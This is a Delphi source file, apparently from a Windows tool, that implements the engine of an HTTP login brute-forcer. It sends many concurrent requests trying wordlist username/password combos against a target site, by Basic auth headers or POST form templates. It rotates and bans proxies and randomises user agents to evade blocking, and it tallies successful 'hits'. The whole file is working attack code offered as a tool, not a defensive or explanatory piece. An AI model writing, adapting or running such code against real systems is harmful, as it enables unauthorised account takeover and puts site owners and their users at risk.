unit uBruteForcer;

interface

uses
  Classes, SysUtils, ExtCtrls, HttpProt, uKeywordBot, uWordlist, 
  uAnalyzerListView, uMyListListView, uProgressListView, uResolveHost;
                         
const
  rgHEAD = 0;
  rgGET  = 1;
  rgPOST = 2;

type
  PStatistics = ^TStatistics;
  TStatistics = record  // Record to group statistics data
    i200,
    i3xx,
    i401,
    i403,
    i404,
    i5xx,
    iHits,
    iFakes,
    iRetry,
    iTimeout,
    iPLeft,
    iPBanned,
    iPDisabled: integer;
  end;

  TEngineProcEvent = procedure(Sender: TObject; AHttpCli: TKeywordBot) of object;
  TEngineComboEvent = procedure(Sender: TObject; AHttpCli: TKeywordBot; const strCombo: string;
                       const iPIndex: integer) of object;

  TBruteForcer = class(TObject)
  private
    FAbort                : boolean; // Variable which tells our Engine we need to abort
    FAbortNow             : boolean; // Variable used for hard aborts
    FCount                : integer; // Counts the amount of tries we have done so far
    FBotCount             : integer; // The number of bots currently running
    FMaxBots              : integer; // Contains max amount of bots of engine
    FTimeout              : integer; // Stores how longs bots should go until a timeout (S)
    FURL                  : string;  // URL of site to attack
    FStatistics           : PStatistics; // Variable which will keep track of our statistics
    FTimer                : TTimer;  // Main Timer for our Engine
    FBots                 : array of TKeywordBot; // Array which contains our Bots (used with ManageTimeouts)
    FCurrentProxy         : integer; // What Proxy Index our engine is on
    FEnableAfterFP        : boolean; // Enable After Fingeprinting
    FEnableCheckHit       : boolean; // Enable Check hit with another proxy
    FHeaderFailureKeys    : string; // List of Header Failure Keywords (Seperated by ';')
    FHeaderRetryCodes     : TStrings; // List of Retry Status Codes (HEAD Requests)
    FHeaderSuccessKeys    : string; // List of Header Success Keywords (Seperated by ';')
    FBanKeywords          : TStrings; // List of Keywords to use to ban proxies when scanning for Source Keywords
    FRequestMethod        : integer; // Request Method to use
    FSourceFailureKeys    : string; // List of Source Failure Keywords (Seperated by ';')
    FSourceSuccessKeys    : string; // List of Source Success Keywords (Seperated by ';')
    FFollowRedirects      : boolean;
    FEnableComboConstraints: boolean; // Enables Combo validation
    FUsernameMin          : integer; // Minimum Length the username must be to be tried
    FUsernameMax          : integer; // Max Length the username must be to be tried
    FPasswordMin          : integer;
    FPasswordMax          : integer;
    FCustomHeader         : string; // Header to use (Gets assigned to each bot)
    FUserAgentList        : TStrings; // List of User Agents to use
    FRequiredLength       : integer; // Required Content-Length of Request
    FConstrainHits        : integer; // Stops Engine after X hits; 0 = unlimited
    FEnableMetaRedirects  : boolean; // Look for Meta Redirects
    FProxiesActive        : integer; // Reactivate all proxies when Active Proxies = X
    FWordlist             : TWordlist;
    FMyList               : TMyList;
    FEnableResolveHost    : boolean; // Resolve address to IP before session
    FProgression          : TProgressList;  // Pointer to the Progression List Object
    FRefreshSession       : boolean; // Used in FormBot, retrieves fresh Form Data on each request
    FFormURL              : string; // URL which points to the form (used with RefreshSession)
    FFormReferer          : string; // Referer needed to get to the Form URL
    FFormCookie           : string; // Cookie needed to get to the Form URL
    FPOSTData             : string; // POST Data to send
    FFormAction           : string; // Form Action
    FServer               : string; // Server line from Recieved Header

    FOnBotLaunched        : TEngineProcEvent;
    FOnBotComplete        : TEngineProcEvent;
    FOnEngineComplete     : TNotifyEvent;
    FOnHitFound           : TEngineProcEvent;
    FOnFakeFound          : TEngineComboEvent;
    FOnRedirectFound      : TEngineProcEvent;
    FOnUpdateListview     : TEngineProcEvent;
    FOnUpdateProgressList : TNotifyEvent;
    FOnServerFound        : TNotifyEvent;

    function  ResolveHost: boolean;
    procedure CreateBot;
    function  DestroyBot(var AHttpCli: TKeywordBot): boolean;
    procedure LaunchBot(AHttpCli: TKeywordBot);
    procedure AssignAndLaunchBot(var AHttpCli: TKeywordBot);
    procedure ResolveHostError(Sender: TObject; const strMsg: string);
    procedure TriggerUpdateProgressList;
    procedure TriggerUpdateListview(AHttpCli: TKeywordBot; strStatus: string);
    procedure TriggerBotLaunched(AHttpCli: TKeywordBot);
    procedure TriggerBotComplete(AHttpCli: TKeywordBot);
    procedure TriggerHitFound(AHttpCli: TKeywordBot);
    procedure TriggerFakeFound(AHttpCli: TKeywordBot; const strCombo: string; const iPIndex: integer);
    procedure TriggerRedirectFound(AHttpCli: TKeywordBot);
    procedure TriggerServerFound;
    procedure TriggerEngineComplete;
    function  Abort(AHttpCli: TKeywordBot): boolean;
    procedure AHttpCliBeforeHeaderSend(Sender: TObject; const Method : String; Headers: TStrings);
    procedure AHttpCliBanProxy(Sender: TObject; BanIndex: integer; strReason: string);
    procedure AHttpCliDisableProxy(Sender: TObject; BanIndex: integer; strReason: string);
    procedure AHttpCliBotLaunched(Sender: TObject);
    procedure AHttpCliSetProxy(Sender: TObject);
    procedure AHttpCliUpdateListview(Sender: TObject);
    procedure AHttpCliFakeFound(Sender: TObject; const strCombo: string; const iPIndex: integer);
    function  GetServer(const strHeader: string): string;
    procedure AHttpCliRequestDone(Sender: TObject; RqType: THttpRequest; Error: Word);
    procedure AHttpCliLocationChange(Sender: TObject);
    procedure ManageTimeouts(Sender: TObject);
    function  SetProxy (var AHttpCli: TKeywordBot): boolean;
    function  GetValidCombo: boolean;
    function  NextCombo(var AHttpCli: TKeywordBot): boolean;
    procedure RetryBot(AHttpCli: TKeywordBot);
  public
    procedure  CreateAllBots;
    procedure  InitializeEngine;
    procedure  AbortEngine;
    function   GetBots: TList;
    destructor Destroy; override;

    property BanKeywords         : TStrings           read  FBanKeywords
                                                      write FBanKeywords;
    property Bots                : integer            read  FMaxBots
                                                      write FMaxBots;
    property ConstrainHits       : integer            read  FConstrainHits
                                                      write FConstrainHits;
    property CustomHeader        : string             read  FCustomHeader
                                                      write FCustomHeader;
    property EnableAfterFP       : boolean            read  FEnableAfterFP
                                                      write FEnableAfterFP;
    property EnableCheckHits     : boolean            read  FEnableCheckHit
                                                      write FEnableCheckHit;
    property EnableComboConstraints: boolean           read  FEnableComboConstraints
                                                      write FEnableComboConstraints;
    property EnableMetaRedirects : boolean            read  FEnableMetaRedirects
                                                      write FEnableMetaRedirects;
    property EnableResolveHost   : boolean            read  FEnableResolveHost
                                                      write FEnableResolveHost;
    property FollowRedirects     : boolean            read  FFollowRedirects
                                                      write FFollowRedirects;
    property FormAction          : string             read  FFormAction
                                                      write FFormAction;
    property FormCookie          : string             read  FFormCookie
                                                      write FFormCookie;
    property FormReferer         : string             read  FFormReferer
                                                      write FFormReferer;
    property FormURL             : string             read  FFormURL
                                                      write FFormURL;
    property HeaderFailureKeys   : string             read  FHeaderFailureKeys
                                                      write FHeaderFailureKeys;
    property HeaderRetryCodes    : TStrings           read  FHeaderRetryCodes
                                                      write FHeaderRetryCodes;
    property HeaderSuccessKeys   : string             read  FHeaderSuccessKeys
                                                      write FHeaderSuccessKeys;
    property MyList              : TMyList            read  FMyList
                                                      write FMyList;
    property PasswordMax         : integer            read  FPasswordMax
                                                      write FPasswordMax;
    property PasswordMin         : integer            read  FPasswordMin
                                                      write FPasswordMin;
    property Position            : integer            read  FCount
                                                      write FCount;
    property POSTData            : string             read  FPOSTData
                                                      write FPOSTData;
    property ProgressList        : TProgressList      read  FProgression
                                                      write FProgression;
    property ProxiesActive       : integer            read  FProxiesActive
                                                      write FProxiesActive;
    property RefreshSession      : boolean            read  FRefreshSession
                                                      write FRefreshSession;
    property RequestMethod       : integer            read  FRequestMethod
                                                      write FRequestMethod;
    property RequiredLength      : integer            read  FRequiredLength
                                                      write FRequiredLength;
    property Server              : string             read  FServer;
    property SourceFailureKeys   : string             read  FSourceFailureKeys
                                                      write FSourceFailureKeys;
    property SourceSuccessKeys   : string             read  FSourceSuccessKeys
                                                      write FSourceSuccessKeys;
    property Statistics          : PStatistics        read  FStatistics;
    property Timeout             : integer            read  FTimeout
                                                      write FTimeout;
    property URL                 : string             read  FURL
                                                      write FURL;
    property UserAgentList       : TStrings           read  FUserAgentList
                                                      write FUserAgentList;
    property UsernameMax         : integer            read  FUsernameMax
                                                      write FUsernameMax;
    property UsernameMin         : integer            read  FUsernameMin
                                                      write FUsernameMin;
    property Wordlist            : TWordlist          read  FWordlist
                                                      write FWordlist;
    property OnBotLaunched       : TEngineProcEvent   read  FOnBotLaunched
                                                      write FOnBotLaunched;
    property OnBotComplete       : TEngineProcEvent   read  FOnBotComplete
                                                      write FOnBotComplete;
    property OnEngineComplete    : TNotifyEvent       read  FOnEngineComplete
                                                      write FOnEngineComplete;
    property OnFakeFound         : TEngineComboEvent  read  FOnFakeFound
                                                      write FOnFakeFound;
    property OnHitFound          : TEngineProcEvent   read  FOnHitFound
                                                      write FOnHitFound;
    property OnRedirectFound     : TEngineProcEvent   read  FOnRedirectFound
                                                      write FOnRedirectFound;
    property OnServerFound       : TNotifyEvent       read  FOnServerFound
                                                      write FOnServerFound;
    property OnUpdateListview    : TEngineProcEvent   read  FOnUpdateListview
                                                      write FOnUpdateListview;
    property OnUpdateProgressList: TNotifyEvent       read  FOnUpdateProgressList
                                                      write FOnUpdateProgressList;
  end;

implementation

uses Windows, FastStrings, FastStringFuncs, uBasicBot, uFunctions, Dialogs,
     uFormBot, uFormParserBot;

// If True, then the Engine has Aborted.
function TBruteForcer.ResolveHost: boolean;
var FResolveHost: TResolveHost;
    strDomain: string;

begin
  strDomain := GetDomain (FURL);

  FResolveHost := TResolveHost.Create;
  try
   FResolveHost.Address := strDomain;
   FResolveHost.OnError := ResolveHostError;
   FResolveHost.ResolveAddr;
   // Resolved domain is equal to given domain, so we can
   // make the replacement
   if strDomain = FResolveHost.Hostname then
    begin
     FURL := FastReplace (FURL, strDomain, FResolveHost.IP);
     FCustomHeader := FastReplace (FCustomHeader, strDomain, FResolveHost.IP);
    end;
  finally
   FResolveHost.Free;
  end;

  // FAbort is set during the OnError event if it is fired
  Result := FAbort;
end;

// Creates a single bot, assigns it, and launches it
procedure TBruteForcer.CreateBot;
var AHttpCli: TKeywordBot;
    aItem: TProgressItem;

begin
  case FRequestMethod of
   rgPOST:
    begin
     AHttpCli := TFormBot.Create (nil);

     with AHttpCli as TFormBot do
      begin
       FormData^.Action := FFormAction;
       FormURL := FFormURL;
       FormCookie := FFormCookie;
       FormReferer := FFormReferer;
       POSTData := FPOSTData;
       RefreshSession := FRefreshSession;
       Statistics := FStatistics;
      end;
    end;

   else
    begin
     AHttpCli := TBasicBot.Create (nil);

     // Assign BasicBot properties
     with AHttpCli as TBasicBot do
      begin
       EnableAfterFP := FEnableAfterFP;
       EnableCheckHit := FEnableCheckHit;
       EnableMetaRedirects := FEnableMetaRedirects;
       RequestMethod := FRequestMethod;
       RequiredLength := FRequiredLength;
       Statistics := FStatistics;
       OnFakeFound := AHttpCliFakeFound;
      end;
    end;
  end;

  with AHttpCli do
   begin
    // Count with 0
    Bot := FBotCount;
    Timeout := FTimeout;
    FollowRedirects := FFollowRedirects;
    HeaderFailureKeys := FHeaderFailureKeys;
    HeaderRetryCodes := FHeaderRetryCodes;
    HeaderSuccessKeys := FHeaderSuccessKeys;
    BanKeywords := FBanKeywords;
    SourceFailureKeys := FSourceFailureKeys;
    SourceSuccessKeys := FSourceSuccessKeys;

    URL := FURL;
    Virtual := True;

    OnBeforeHeaderSend := AHttpCliBeforeHeaderSend;
    OnUpdateListview := AHttpCliUpdateListview;
    if Assigned (FMyList) then
     begin
      OnBanProxy := AHttpCliBanProxy;
      OnDisableProxy := AHttpCliDisableProxy;
     end;
    OnSetProxy := AHttpCliSetProxy;
    OnLocationChange := AHttpCliLocationChange;
    OnRequestDone := AHttpCliRequestDone;
    OnBotLaunched := AHttpCliBotLaunched;
   end;

  if Length (FBots) < FMaxBots then
   SetLength (FBots, FMaxBots);

  FBots[FBotCount] := AHttpCli;
  Inc (FBotCount);

  // Create a Progression List Item for our bot
  aItem := TProgressItem.Create;
  aItem.BotNumber := FBotCount;
  FProgression.Add (aItem);
  TriggerUpdateProgressList;

  AssignAndLaunchBot (AHttpCli);
end;

function TBruteForcer.DestroyBot(var AHttpCli: TKeywordBot): boolean;
begin
  Result := False;

  // Get last bot in the list
  if AHttpCli.Bot = Length (FBots) - 1 then
   begin
    FreeAndNil (FBots[AHttpCli.Bot]);

    Dec (FBotCount);
    SetLength (FBots, FBotCount);
    FProgression.Delete (FBotCount);
    TriggerUpdateProgressList;
    Result := True;
   end;
end;

// Creates the max amount of bots we need for our Engine
procedure TBruteForcer.CreateAllBots;
begin
  while (FBotCount < FMaxBots) and (FCount < FWordlist.Count) do
   CreateBot;
end;

// Blank all important variables and create the FTimer and lstBots
procedure TBruteForcer.InitializeEngine;
begin
  FAbort := False;
  FAbortNow := False;
  FBotCount := 0;
  // Used in AfterFingerPrints and User Agents
  Randomize;

  // Reset Wordlist when starting a test and it is already at the end
  if FCount >= FWordlist.Count then
   FCount := 0;

  if FEnableResolveHost then
   begin
    if ResolveHost then
     Exit;
   end;

  New (FStatistics);

  with FStatistics^ do
   begin
    i200 := 0;
    i3xx := 0;
    i401 := 0;
    i403 := 0;
    i404 := 0;
    i5xx := 0;
    iHits := 0;
    iFakes := 0;
    iRetry := 0;
    iTimeout := 0;
    if Assigned (FMyList) then
     begin
      iPLeft := FMyList.Active;
      iPBanned := FMyList.Banned;
      iPDisabled := FMyList.Disabled;
     end
    else
     begin
      iPLeft := 0;
      iPBanned := 0;
      iPDisabled := 0;
     end;
   end;

  FTimer := TTimer.Create (nil);

  // By Default, the timer is enabled and set to 1000 interval which
  // is what we want

  FTimer.OnTimer := ManageTimeouts;

  // Set our bot array to the capacity of the engine
  SetLength (FBots, FMaxBots);
end;

procedure TBruteForcer.LaunchBot(AHttpCli: TKeywordBot);
begin
  case FRequestMethod of
   rgHEAD: AHttpCli.HeadAsync;
   rgGET:  AHttpCli.GetAsync;
   rgPOST:
    begin
     with AHttpCli as TFormBot do
      begin
       // if true, launches a GET request which populates form data
       if GetFormData = False then
        LaunchPOSTRequest;
      end;
    end;
  end;
end;

// Because this procedure can abort a bot, when it is used it must be the
// last call before the scope is exited.  Otherwise a bot would be aborted
// and further code in another procedure would try to call the bot.
procedure TBruteForcer.AssignAndLaunchBot(var AHttpCli: TKeywordBot);
begin
  // Try to get another combo, if NextCombo is true, then we have reached the end
  // of the list without a combo so we need to end the test by aborting.
  if NextCombo (AHttpCli) then
   begin
    FAbort := True;
    Abort (AHttpCli);
   end
  else
   LaunchBot (AHttpCli);
end;

procedure TBruteForcer.AHttpCliBeforeHeaderSend(Sender: TObject; const Method : String; Headers: TStrings);
var AHttpCli: TKeywordBot;
    strHeader: string;
    I: integer;

begin
  AHttpCli := Sender as TKeywordBot;

  if AHttpCli.LockHeader then
   begin
    if FRequestMethod = rgPOST then
     begin
      // Remove Authorization: Basic line from GET request
      for I := Headers.Count - 1 downto 0 do
       begin
        if FastPosNoCase (Headers.Strings[I], 'Authorization', Length (Headers.Strings[I]), 13, 1) <> 0 then
         begin
          Headers.Delete (I);
          Break;
         end;
       end;
     end;

    AHttpCli.SentHeader := Headers.Text;
    Exit;
   end;

  // Replace Current Header with our Custom Header
  strHeader := FCustomHeader;

  // Fill in the variables
  strHeader := FastReplace (strHeader, '<COMBO>', EncodeStr (encBase64, AHttpCli.Username + ':' + AHttpCli.Password));
  if FUserAgentList.Count <> 0 then
   strHeader := FastReplace (strHeader, '<USER AGENT>', FUserAgentList.Strings[Random (FUserAgentList.Count)]);
  if FRequestMethod = rgPOST then
   begin
    strHeader := FastReplace (strHeader, '<CONTENT LENGTH>', IntToStr (AHttpCli.SendStream.Size));
    with AHttpCli as TFormBot do
     begin
      strHeader := FastReplace (strHeader, '<FORM ACTION>', FormData^.Action);
      if FormData^.Cookie <> '' then
       strHeader := strHeader + 'Cookie: ' + FormData^.Cookie
      // If Form Data didn't have a cookie, try to use the one provided
      else if FFormCookie <> '' then
       strHeader := strHeader + 'Cookie: ' + FFormCookie;
     end;
   end;

  Headers.Text := Trim (strHeader);
  AHttpCli.SentHeader := Headers.Text;

  // Append POST Data to Sent Header if POST
  if FRequestMethod = rgPOST then
   AHttpCli.SentHeader := AHttpCli.SentHeader + #13#10 + TFormBot (AHttpCli).POSTData;
end;

procedure TBruteForcer.AHttpCliBanProxy(Sender: TObject; BanIndex: integer; strReason: string);
begin
  if Assigned (FMyList) then
   FMyList.BanProxy (BanIndex, strReason);
end;

procedure TBruteForcer.AHttpCliDisableProxy(Sender: TObject; BanIndex: integer; strReason: string);
begin
  if Assigned (FMyList) then
   FMyList.DisableProxy (BanIndex, strReason);
end;

procedure TBruteForcer.AHttpCliUpdateListview(Sender: TObject);
begin
  TriggerUpdateListview (Sender as TKeywordBot, (Sender as TKeywordBot).Status);
end;

procedure TBruteForcer.AHttpCliBotLaunched(Sender: TObject);
begin
  TriggerBotLaunched (Sender as TKeywordBot);
end;

procedure TBruteForcer.AHttpCliSetProxy(Sender: TObject);
begin
  if SetProxy (TKeywordBot (Sender)) then
   begin
    FAbort := True;
    AbortEngine;
   end;
end;

// Returns the "Server:" field's value from the received header.
function TBruteForcer.GetServer(const strHeader: string): string;
var I, J: integer;

begin
  I := FastPosNoCase (strHeader, 'Server', Length (strHeader), 6, 1) + 8;
  if I <> 8 then
   begin
    J := FastCharPos (strHeader, #13, I);
    Result := CopyStr (strHeader, I, J - I);
   end;
end;

procedure TBruteForcer.AHttpCliFakeFound(Sender: TObject; const strCombo: string; const iPIndex: integer);
begin
  Inc (FStatistics^.iFakes);
  TriggerFakeFound (Sender as TKeywordBot, strCombo, iPIndex);
end;

procedure TBruteForcer.AHttpCliRequestDone(Sender: TObject; RqType: THttpRequest; Error: Word);
var AHttpCli: TKeywordBot;

begin
  AHttpCli := Sender as TKeywordBot;

  FProgression.Items[AHttpCli.Bot].Response := AHttpCli.Status;

  if FServer = '' then
   begin
    FServer := GetServer (AHttpCli.RcvdHeader.Text);
    TriggerServerFound;
   end;

  case AHttpCli.Judgement of
   judRetry, judTimeout:
    begin
     if AHttpCli.Judgement = judTimeout then
      Inc (FStatistics^.iTimeout);

     if FAbortNow = False then
      begin
       RetryBot (AHttpCli);
       Exit;
      end;
    end;

   judRedirect: TriggerRedirectFound (TKeywordBot (Sender));

   judGood:
    begin
     TriggerHitFound (AHttpCli);
     Inc (FStatistics^.iHits);
     if (FConstrainHits <> 0) and (FStatistics^.iHits >= FConstrainHits) then
      FAbort := True;
    end;
  end;

  TriggerBotComplete (AHttpCli);

  if Abort (AHttpCli) then
   Exit;

  if (FBotCount < FMaxBots) and (FCount < FWordlist.Count)  then
   CreateBot
  else if FBotCount > FMaxBots then
   begin
    if DestroyBot (TKeywordBot (AHttpCli)) then
     Exit;
   end;

  if FCount >= FWordlist.Count then
   begin
    FAbort := True;
    Abort (AHttpCli);
   end
  else
   AssignAndLaunchBot (TKeywordBot (Sender));
end;

procedure TBruteForcer.AHttpCliLocationChange(Sender: TObject);
begin
  // Always lock header before sending redirect request
  TKeywordBot (Sender).LockHeader := True;
end;

procedure TBruteForcer.ResolveHostError(Sender: TObject; const strMsg: string);
begin
  MessageDlg (strMsg, mtError, [mbOK], 0);
  FAbort := True;
  TriggerEngineComplete;
end;

procedure TBruteForcer.TriggerUpdateProgressList;
begin
  if Assigned (FOnUpdateProgressList) then
   FOnUpdateProgressList (Self);
end;

procedure TBruteForcer.TriggerUpdateListview(AHttpCli: TKeywordBot; strStatus: string);
begin
  FProgression[AHttpCli.Bot].Response := strStatus;
  if Assigned (FOnUpdateListview) then
   FOnUpdateListview (Self, AHttpCli);
end;

procedure TBruteForcer.TriggerBotLaunched(AHttpCli: TKeywordBot);
begin
  if Assigned (FOnBotLaunched) then
   FOnBotLaunched (Self, AHttpCli);
end;

procedure TBruteForcer.TriggerBotComplete(AHttpCli: TKeywordBot);
begin
  if Assigned (FOnBotComplete) then
   FOnBotComplete (Self, AHttpCli);
end;

procedure TBruteForcer.TriggerHitFound(AHttpCli: TKeywordBot);
begin
  if Assigned (FOnHitFound) then
   FOnHitFound (Self, AHttpCli);
end;

procedure TBruteForcer.TriggerFakeFound(AHttpCli: TKeywordBot; const strCombo: string; const iPIndex: integer);
begin
  if Assigned (FOnFakeFound) then
   FOnFakeFound (Self, AHttpCli, strCombo, iPIndex);
end;

procedure TBruteForcer.TriggerRedirectFound(AHttpCli: TKeywordBot);
begin
  if Assigned (FOnRedirectFound) then
   FOnRedirectFound (Self, AHttpCli);
end;

procedure TBruteForcer.TriggerServerFound;
begin
  if Assigned (FOnServerFound) then
   FOnServerFound (Self);
end;

procedure TBruteForcer.TriggerEngineComplete;
begin
  if Assigned (FOnEngineComplete) then
   FOnEngineComplete (Self);
end;

// It is a function because we need to Exit immediately after we have freed the Bot
// True if we Aborted which will free a Bot Component and decrease FBotCount
//
// If not true, then we don't need to abort yet. This is checked after each bot is
// completed, just incase the user hit the Abort Button.
//
// When all Bots are freed, we can free other Components and trigger OnEngineComplete
function TBruteForcer.Abort(AHttpCli: TKeywordBot): boolean;
begin
  if FAbort then
   begin
    FreeAndNil (FBots[AHttpCli.Bot]);

    Dec (FBotCount);

    if FBotCount = 0 then
     begin
      SetLength (FBots, 0);
      FTimer.Free;

      TriggerEngineComplete;
     end;

    Result := True;
   end
  else
   Result := False;
end;

// This is the heart of the timeout system for this engine.
// This procedure is Set as the OnTimer Event for FTimer which is fired ever second.
//
// What this procedure does is it runs through our entire list of Bots and checks which
// ones are still active (not nil)
//
// If a Bot is still active, we check it with its timestamp which is all done inside
// uVTHttpWrapper
//
// If it is a timeout, we abort and declare it a timeout (done in wrapper component)
// If it is not a timeout, we don't do anything.
procedure TBruteForcer.ManageTimeouts(Sender: TObject);
var I: integer;
    AHttpCli: TKeywordBot;

begin
  for I := 0 to Length (FBots) - 1 do
   begin
    if Assigned (FBots[I]) then
     begin
      AHttpCli := FBots[I];
      if AHttpCli.IsTimeout then
       begin
        AHttpCli.BotTimeout;
        Inc (FStatistics^.iTimeout);
       end;
     end;
   end;
end;

// Triggers an Engine Abort
procedure TBruteForcer.AbortEngine;
var I: integer;

begin
  FAbortNow := (FAbort = True);
  FAbort := True;

  if FAbortNow then
   begin
    for I := 0 to Length (FBots) - 1 do
     begin
      if Assigned (FBots[I]) then
       FBots[I].BotTimeout;
     end;
   end;
end;

// Returns True when no more proxies are left
function TBruteForcer.SetProxy (var AHttpCli: TKeywordBot): boolean;
begin
  Result := False;

  if Assigned (FMyList) = False then
   Exit;

  // Reactivate all proxies when none are left
  if FMyList.Active <= FProxiesActive then
   begin
    FMyList.ReactivateAllProxies;

    if FMyList.Active <= FProxiesActive then
     begin
      Result := True;
      Exit;
     end;
   end;

  // Update Proxy Statistics
  with FStatistics^ do
   begin
    iPLeft := FMyList.Active;
    iPBanned := FMyList.Banned;
    iPDisabled := FMyList.Disabled;
   end;

  AHttpCli.Proxy := '';

  repeat
   if FMyList.Items[FCurrentProxy].ImageIndex = 0 then
    begin
     with FMyList.Items[FCurrentProxy] do
      begin
       AHttpCli.Proxy := Proxy;
       AHttpCli.ProxyPort := Port;
      end;

     FProgression.Items[AHttpCli.Bot].Proxy := AHttpCli.Proxy + ':' + AHttpCli.ProxyPort;
     // Current MyList Index of the proxy in use
     AHttpCli.Tag := FCurrentProxy;
    end;
   Inc (FCurrentProxy);
   if FCurrentProxy > FMyList.Count - 1 then
    FCurrentProxy := 0;
  until AHttpCli.Proxy <> '';
end;

// Cycles through Combos to find one that meets the Username/Password Constraints
// Returns True if we reach the end of the list and don't have a valid combo.
function TBruteForcer.GetValidCombo: boolean;
begin
  Result := False;

  while (Length (FWordlist[FCount].User) in [FUsernameMin..FUsernameMax] = False) or
        (Length (FWordlist[FCount].Pass) in [FPasswordMin..FPasswordMax] = False) do
   begin
    Inc (FCount);

    if FCount >= FWordlist.Count then
     begin
      Result := True;
      Break;
     end;
   end;
end;

// Returns True when there are no more combos or proxies to try
function TBruteForcer.NextCombo(var AHttpCli: TKeywordBot): boolean;
begin
  Result := False;

  AHttpCli.ClearVariables;

  if SetProxy (AHttpCli) then
   begin
    Result := True;
    Exit;
   end;

  if FEnableComboConstraints then
   begin
    if GetValidCombo then
     begin
      Result := True;
      Exit;
     end;
   end;

  if FCount >= FWordlist.Count then
   begin
    Result := True;
    Exit;
   end;

  with FWordlist.Items[FCount] do
   begin
    // Set Username and Password for POST Requests also.
    // They are just holders of the Username and Password
    // for display purposes.
    AHttpCli.Username := User;
    AHttpCli.Password := Pass;
   end;

  if FRequestMethod = rgPOST then
   begin
    // Use FPOSTData as a Template
    with TFormBot (AHttpCli) do
     begin
      POSTData := FastReplace (FPOSTData, '<USER>', Username);
      POSTData := FastReplace (POSTData, '<PASS>', Password);
     end;
   end;

  with FProgression.Items[AHttpCli.Bot] do
   begin
    Username := AHttpCli.Username;
    Password := AHttpCli.Password;
   end;

  Inc (FCount);
end;

// A simple Relaunch.  No banning or rotating of proxies occur.  This
// should be done before RequestDone is inherited from the bot level.
procedure TBruteForcer.RetryBot(AHttpCli: TKeywordBot);
begin
  TriggerUpdateListview (AHttpCli, AHttpCli.Status + ' -> Retrying Bot');

  Inc (FStatistics^.iRetry);

  LaunchBot (AHttpCli);
end;

// TList must be freed by the outside function call.
function TBruteForcer.GetBots: TList;
var I: integer;

begin
  Result := TList.Create;

  for I := 0 to Length (FBots) - 1 do
   Result.Add (FBots[I]);
end;

destructor TBruteForcer.Destroy;
begin
  Dispose (FStatistics);
  FUserAgentList.Free;
  FWordlist.Free;
  if Assigned (FMyList) then
   begin
    FMyList.SaveToFile (ExtractFilePath (ParamStr (0)) + 'MyList.ini', True);
    FMyList.Free;
   end;

  // Save Wordlist Position
  IniFileWriteInteger (ExtractFilePath (ParamStr (0)) + 'Settings.ini', 'Lists', 'StartSearch', FCount + 1);

  // Free the Lists if they are assigned
  if Assigned (FBanKeywords) then
   FBanKeywords.Free;
  if Assigned (FHeaderRetryCodes) then
   FHeaderRetryCodes.Free;

  inherited;
end;

end.
